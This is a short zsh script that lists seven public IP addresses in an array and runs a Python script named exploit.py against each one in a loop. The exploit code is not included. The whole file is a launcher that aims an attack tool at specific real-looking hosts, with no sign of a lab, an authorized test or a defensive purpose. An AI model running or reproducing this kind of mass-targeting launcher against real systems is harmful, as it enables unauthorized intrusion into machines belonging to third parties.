#!/usr/bin/zsh
ip_array=("163.29.159.200" "117.56.41.188" "210.69.122.22" "163.29.186.170" "163.29.204.151" "163.29.249.135" "210.241.82.170")

for element in "${ip_array[@]}"; do
    python3 exploit.py --target $element
done
